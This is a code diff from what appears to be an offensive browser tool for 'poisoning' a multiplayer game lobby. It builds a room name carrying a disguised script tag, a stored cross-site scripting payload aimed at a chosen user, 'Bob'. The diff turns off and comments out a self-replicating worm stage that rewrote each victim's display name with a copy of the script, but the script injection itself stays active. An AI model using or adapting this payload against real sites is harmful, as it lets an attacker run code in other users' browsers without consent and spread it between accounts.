@@ -156,7 +156,7 @@
                     <input class="form-control m-2" name="targetUser" id="targetUser" value="Bob" type="text" placeholder="Bob" disabled>
                 </div>
                 <div class="form-group form-check">
-                    <input class="form-check-input my-2 ml-3" type="checkbox" value="" id="worm" checked>
+                    <input class="form-check-input my-2 ml-3" type="checkbox" value="" id="worm" >
                     <label class="form-check-label m-2" for="worm">Worm</label>
                 </div>
                 <input class="btn btn-danger m-2" type="submit" value="Start poisoning lobby">
@@ -846,10 +846,10 @@ infectLobbyForm.addEventListener("submit", function (event) {
         let roomName = 'My room.';
         roomName += '<scr'+'ipt>';
         roomName += `if(NAME==='Bob'){`;
-        roomName += `function worm(){if(window._infected===undefined){var oldName=NAME;`;
+        //roomName += `function worm(){if(window._infected===undefined){var oldName=NAME;`;
         roomName += discoverRoom;
-        roomName += `displayDefaultState = function () { $("#room-id-info") ["hide"](); $("#room-disconnected") ["hide"](); $("#room-leave") ["show"](); $(".user-you .multiplayer-profile-image") ["removeClass"]("") ["addClass"]("profile-photo-sm multiplayer-profile-image " + USER); $(".user-you .user-name") ["text"](oldName); generateFlairs(USER, $(".user-you .flairs"), $(".user-you .user-name")); $("ul#room-participants") ["html"]("") };`;
-        roomName += `;NAME='<sc'+'ript> '+worm.toString()+' ;worm();</sc'+'ript>'+oldName;Unity.setName(NAME);window._infected=true;}}; worm();`;
+        //roomName += `displayDefaultState = function () { $("#room-id-info") ["hide"](); $("#room-disconnected") ["hide"](); $("#room-leave") ["show"](); $(".user-you .multiplayer-profile-image") ["removeClass"]("") ["addClass"]("profile-photo-sm multiplayer-profile-image " + USER); $(".user-you .user-name") ["text"](oldName); generateFlairs(USER, $(".user-you .flairs"), $(".user-you .user-name")); $("ul#room-participants") ["html"]("") };`;
+        //roomName += `;NAME='<sc'+'ript> '+worm.toString()+' ;worm();</sc'+'ript>'+oldName;Unity.setName(NAME);window._infected=true;}}; worm();`;
         roomName += '}';
         roomName += '</sc'+'ript>';
 
